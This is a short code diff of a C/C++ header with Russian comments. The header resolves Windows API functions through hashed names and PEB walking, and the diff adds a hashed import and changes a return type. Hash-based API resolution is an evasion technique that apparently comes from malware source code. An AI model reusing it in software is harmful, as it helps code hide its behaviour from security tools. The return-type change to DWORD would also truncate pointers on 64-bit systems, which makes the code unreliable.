@@ -70,7 +70,7 @@ LPVOID GetPEB();
 //             поиск. Если не указать, то будет
 //             использован адрес самой функции
 //--------------------------------------------------
-LPVOID WINAPI GetImageBase(LPVOID ProcAddr = NULL);
+DWORD WINAPI GetImageBase(LPVOID ProcAddr = NULL);
 
 
 LPVOID GetApiAddr( HMODULE hModule, DWORD dwProcNameHash );
@@ -428,10 +428,12 @@ const static int ApiCacheSize = 555;
 #define pFlushFileBuffers			pushargEx< DLL_KERNEL32, 0x2f2feeda, 194 >	
 #define pGetStartupInfoA			pushargEx< DLL_KERNEL32, 0x407A1C6A, 195 >
 #define _pGetLastError    			pushargEx< DLL_KERNEL32, 0x1297812C, 0 >
+#define pWritePrivateProfileStringA	pushargEx< DLL_KERNEL32, 0xEEBA10CD, 0 >
 #define pIsWow64Process             pushargEx< DLL_KERNEL32, 0x52AC19C,  0 >
 #define pGetNativeSystemInfo        pushargEx< DLL_KERNEL32, 0x74B624BE, 0 >
 
 
+//advapi32
 //advapi32
 #define pCreateProcessAsUserA		pushargEx< DLL_ADVAPI32, 0x985267C4, 196 >
 #define pSetThreadToken				pushargEx< DLL_ADVAPI32, 0xA16FE0FD, 197 >
